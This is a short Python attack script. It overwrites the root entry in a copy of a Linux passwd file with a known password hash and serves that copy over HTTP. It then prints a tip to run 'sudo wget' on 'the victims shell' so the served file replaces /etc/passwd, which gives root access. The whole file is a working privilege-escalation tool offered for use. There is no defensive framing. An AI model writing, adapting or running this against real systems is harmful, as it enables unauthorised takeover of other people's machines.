#!/usr/bin/env python
import os, inspect,crypt, argparse, colorama, socket
colorama.init()

if os.name != "posix":
    print(f"{colorama.Fore.RED}[!]{colorama.Fore.WHITE} This script only works on Linux")
    exit()

parser = argparse.ArgumentParser()
parser.add_argument("--file", type=str, help="passwd file to overwrite")
parser.add_argument("--port", type=str, help="Port to run web server on")
args = parser.parse_args()

if args.file == None:
	print(f"{colorama.Fore.RED}[x]{colorama.Fore.WHITE} Argument {colorama.Fore.RED}<file>{colorama.Fore.WHITE} is required but missing.")
	exit()
if args.port == None:
	args.port = 8080
url = f"http://{socket.gethostbyname(socket.gethostname())}:{args.port}/{args.file}"

def _write_passwd(file, password) -> None:
    try:
        f = open(file, "r")
        lines = f.readlines()
        lines[0] = f"root:{crypt.crypt(password)}\n"

        f = open(file, "w")
        f.writelines(lines)
    except PermissionError as e:
        print(f"{colorama.Fore.RED}[!]{colorama.Fore.WHITE} Permission denied: {e}")
        exit()
    except FileNotFoundError as e:
        print(f"{colorama.Fore.RED}[!]{colorama.Fore.WHITE} File not found: {e}")
        exit()

_write_passwd(args.file, "root")


print(f"{colorama.Fore.GREEN}[+]{colorama.Fore.WHITE} Starting {colorama.Fore.GREEN}http.server {colorama.Fore.WHITE} on port {colorama.Fore.GREEN+str(args.port)+colorama.Fore.WHITE}")
print(f"{colorama.Fore.GREEN}[TIP]{colorama.Fore.WHITE} Execute this command on the victims shell: {colorama.Fore.GREEN}sudo wget {url} -O /etc/passwd {colorama.Fore.WHITE}")
print(f"{colorama.Fore.GREEN}[TIP]{colorama.Fore.WHITE} Happy Hacking! Switch users to root and enjoy your new shell!")

os.system(f"python -m http.server {args.port}")

